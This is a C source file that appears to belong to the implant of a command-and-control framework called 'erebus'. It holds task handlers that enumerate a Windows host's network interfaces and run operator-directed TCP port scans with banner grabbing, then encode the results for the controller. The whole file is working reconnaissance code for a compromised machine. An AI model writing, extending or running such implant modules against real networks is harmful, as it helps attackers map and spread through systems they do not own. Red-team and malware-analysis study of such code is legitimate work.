#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/pb_c2.h"
#include "erebus/task_handlers.h"

#pragma comment(lib, "iphlpapi.lib")

static void format_mac(const BYTE *phys, ULONG len, char *out, size_t cap) {
    if (!phys || len == 0) { out[0] = '\0'; return; }
    size_t o = 0;
    for (ULONG i = 0; i < len && o + 3 < cap; i++) {
        o += (size_t)snprintf(out + o, cap - o, "%02X%s", phys[i], (i + 1 < len) ? ":" : "");
    }
}

int erebus_task_net_ifconfig(uint8_t **out, size_t *out_len) {
    ULONG buf_len = 15000;
    PIP_ADAPTER_ADDRESSES addrs = NULL;
    for (int i = 0; i < 3; i++) {
        addrs = (PIP_ADAPTER_ADDRESSES)malloc(buf_len);
        if (!addrs) return 0;
        ULONG err = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, addrs, &buf_len);
        if (err == ERROR_SUCCESS) break;
        free(addrs);
        addrs = NULL;
        if (err != ERROR_BUFFER_OVERFLOW) return 0;
    }
    if (!addrs) return 0;

    size_t cap = 8, count = 0;
    erebus_net_interface *ifaces = (erebus_net_interface *)calloc(cap, sizeof(*ifaces));
    if (!ifaces) { free(addrs); return 0; }

    for (PIP_ADAPTER_ADDRESSES cur = addrs; cur; cur = cur->Next) {
        if (count >= cap) {
            cap *= 2;
            erebus_net_interface *n = (erebus_net_interface *)realloc(ifaces, cap * sizeof(*ifaces));
            if (!n) goto fail;
            ifaces = n;
        }
        erebus_net_interface *iface = &ifaces[count];
        memset(iface, 0, sizeof(*iface));
        WideCharToMultiByte(CP_UTF8, 0, cur->FriendlyName, -1, iface->name, sizeof(iface->name), NULL, NULL);
        format_mac(cur->PhysicalAddress, cur->PhysicalAddressLength, iface->mac, sizeof(iface->mac));
        iface->mtu = cur->Mtu;
        iface->up = (cur->OperStatus == IfOperStatusUp) ? 1 : 0;

        size_t acap = 4, ac = 0;
        iface->addresses = (char **)calloc(acap, sizeof(char *));
        for (PIP_ADAPTER_UNICAST_ADDRESS ua = cur->FirstUnicastAddress; ua; ua = ua->Next) {
            char host[NI_MAXHOST];
            if (getnameinfo(ua->Address.lpSockaddr, (socklen_t)ua->Address.iSockaddrLength,
                    host, sizeof(host), NULL, 0, NI_NUMERICHOST) != 0)
                continue;
            if (ac >= acap) {
                acap *= 2;
                char **na = (char **)realloc(iface->addresses, acap * sizeof(char *));
                if (!na) break;
                iface->addresses = na;
            }
            iface->addresses[ac] = _strdup(host);
            if (iface->addresses[ac]) ac++;
        }
        iface->address_count = ac;
        count++;
    }

    int ok = erebus_pb_encode_net_ifconfig_result(ifaces, count, out, out_len);
    erebus_pb_free_net_ifconfig_result(ifaces, count);
    free(addrs);
    return ok;

fail:
    erebus_pb_free_net_ifconfig_result(ifaces, count);
    free(addrs);
    return 0;
}

static int try_connect(const char *host, uint16_t port, uint32_t timeout_ms, char *banner, size_t banner_cap) {
    struct addrinfo hints, *res = NULL, *rp;
    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", (unsigned)port);
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_UNSPEC;

    if (getaddrinfo(host, port_str, &hints, &res) != 0) return 0;

    int open = 0;
    for (rp = res; rp; rp = rp->ai_next) {
        SOCKET s = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (s == INVALID_SOCKET) continue;

        u_long mode = 1;
        ioctlsocket(s, FIONBIO, &mode);
        connect(s, rp->ai_addr, (int)rp->ai_addrlen);

        fd_set wf;
        FD_ZERO(&wf);
        FD_SET(s, &wf);
        struct timeval tv;
        tv.tv_sec = (long)(timeout_ms / 1000);
        tv.tv_usec = (long)((timeout_ms % 1000) * 1000);
        if (select(0, NULL, &wf, NULL, &tv) > 0) {
            open = 1;
            if (banner && banner_cap > 1) {
                fd_set rf;
                FD_ZERO(&rf);
                FD_SET(s, &rf);
                tv.tv_sec = 0;
                tv.tv_usec = 100000;
                if (select(0, &rf, NULL, NULL, &tv) > 0) {
                    int n = recv(s, banner, (int)banner_cap - 1, 0);
                    if (n > 0) banner[n] = '\0';
                }
            }
        }
        closesocket(s);
        if (open) break;
    }
    freeaddrinfo(res);
    return open;
}

int erebus_task_net_portscan(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    static int wsa_done = 0;
    if (!wsa_done) {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0;
        wsa_done = 1;
    }

    erebus_portscan_task task;
    if (!erebus_pb_decode_portscan_task(data, data_len, &task) || !task.target[0] || !task.port_count)
        return 0;

    uint32_t timeout = task.timeout_ms ? task.timeout_ms : 2000;
    erebus_port_result *results = (erebus_port_result *)calloc(task.port_count, sizeof(*results));
    if (!results) return 0;

    for (size_t i = 0; i < task.port_count; i++) {
        strncpy(results[i].host, task.target, sizeof(results[i].host) - 1);
        results[i].port = task.ports[i];
        results[i].open = try_connect(task.target, (uint16_t)task.ports[i], timeout,
            results[i].service, sizeof(results[i].service));
    }

    int ok = erebus_pb_encode_portscan_result(results, task.port_count, out, out_len);
    free(results);
    return ok;
}